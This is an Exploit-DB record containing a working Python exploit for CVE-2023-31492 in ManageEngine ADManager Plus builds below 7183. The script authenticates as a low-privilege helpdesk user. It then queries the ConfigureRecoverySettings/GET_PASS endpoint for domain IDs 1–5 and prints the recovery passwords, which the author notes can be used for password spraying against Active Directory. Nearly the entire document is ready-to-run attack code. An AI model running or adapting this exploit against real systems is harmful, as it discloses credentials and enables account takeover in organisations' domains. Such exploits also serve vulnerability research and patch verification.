{"source": "https://www.exploit-db.com/exploits/51794", "vulnName": "ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure", "vulnEDBID": "51794", "vulnCVE": "N/A", "author": "METIN YUNUS KANDEMIR", "exploitType": "WEBAPPS", "platform": "WINDOWS", "datePublished": "2024-02-13", "vulnContent": "# Exploit Title: ManageEngine ADManager Plus Build < 7183 - Recovery Password Disclosure\n# Exploit Author: Metin Yunus Kandemir\n# Vendor Homepage: https://www.manageengine.com/\n# Software Link: https://www.manageengine.com/products/ad-manager/\n# Details: https://docs.unsafe-inline.com/0day/manageengine-admanager-plus-build-less-than-7183-recovery-password-disclosure-cve-2023-31492\n# Details: https://github.com/passtheticket/vulnerability-research/blob/main/manage-engine-apps/admanager-recovery-password-disclosure.md\n# Version: ADManager Plus Build < 7183\n# Tested against: Build 7180\n# CVE: CVE-2023-31492\n\nimport argparse\nimport requests\nimport urllib3\nimport sys\n\n\"\"\"\nThe Recovery Settings helps you configure the restore and recycle options pertaining to the objects in the domain you wish to recover. \nWhen deleted user accounts are restored, defined password is set to the user accounts. \nHelpdesk technician that has not privilege for backup/recovery operations can view the password and then compromise restored user accounts conducting password spraying attack in the Active Directory environment.\n\"\"\"\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ndef getPass(target, auth, user, password):\n    with requests.Session() as s:\n        if auth.lower() == 'admanager':\n            auth = 'ADManager Plus Authentication'\n        data = {\n            \"is_admp_pass_encrypted\": \"false\",\n            \"j_username\": user,\n            \"j_password\": password,\n            \"domainName\": auth,\n            \"AUTHRULE_NAME\": \"ADAuthenticator\"\n        }\n        # Login\n        url = target + 'j_security_check?LogoutFromSSO=true'\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\"\n        }\n        req = s.post(url, data=data, headers=headers, allow_redirects=True, verify=False)\n        if 'Cookie' in req.request.headers:\n            print('[+] Authentication successful!')\n        elif req.status_code == 200:\n            print('[-] Invalid login name/password!')\n            sys.exit(0)\n        else:\n            print('[-] Something went wrong!')\n            sys.exit(1)\n\n        # Fetching recovery password\n        for i in range(1, 6):\n            print('[*] Trying to fetch recovery password for domainId: %s !' % i)\n            passUrl = target + 'ConfigureRecoverySettings/GET_PASS?req=%7B%22domainId%22%3A%22' + str(i) + '%22%7D'\n            passReq = s.get(passUrl, headers=headers, allow_redirects=False, verify=False)\n            if passReq.content:\n                print(passReq.content)\n\n\ndef main():\n    arg = get_args()\n    target = arg.target\n    auth = arg.auth\n    user = arg.user\n    password = arg.password\n    getPass(target, auth, user, password)\n\n\ndef get_args():\n    parser = argparse.ArgumentParser(\n        epilog=\"Example: exploit.py -t https://target/ -a unsafe.local -u operator1 -p operator1\")\n    parser.add_argument('-t', '--target', required=True, action='store', help='Target url')\n    parser.add_argument('-a', '--auth', required=True, action='store',\n                        help='If you have credentials of the application user, type admanager. If you have credentials of the domain user, type domain DNS name of the target domain.')\n    parser.add_argument('-u', '--user', required=True, action='store')\n    parser.add_argument('-p', '--password', required=True, action='store')\n    args = parser.parse_args()\n    return args\n\n\nmain()\n            "}